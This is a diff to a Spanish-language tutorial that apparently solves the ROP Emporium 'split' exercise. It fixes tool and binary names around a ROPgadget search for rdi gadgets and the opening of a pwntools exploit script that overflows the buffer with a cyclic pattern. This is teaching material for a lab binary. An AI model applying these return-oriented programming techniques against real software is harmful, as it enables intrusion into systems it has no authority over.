@@ -121,7 +121,7 @@ La diferencia radica aqui en que el primer parametro de una funcion en x86_64 es
 
 Necesitamos un gadget, un pequeño trozo de codigo al cual podamos saltar, cambiar el valor del registro y volver
 
-Podemos usar el comando /R [registro] en radare para encontrar gadgets, o la herramienta ROPgadget, a gusto del que quiera:
+Podemos usar el comando /R [registro] en radare2 para encontrar gadgets, o la herramienta ROPgadget, a gusto del consumidor:
 ```
 ROPgadget --binary split|grep rdi
 0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
@@ -133,8 +133,8 @@ Con este gadget podemos sobreescribir rdi:
 ```python
 from pwn import *
 
-elf = context.binary = ELF("./spl1t")
-io = process("./spl1t")
+elf = context.binary = ELF("./split")
+io = process("./split")
 
 payload = flat (
          cyclic(40),
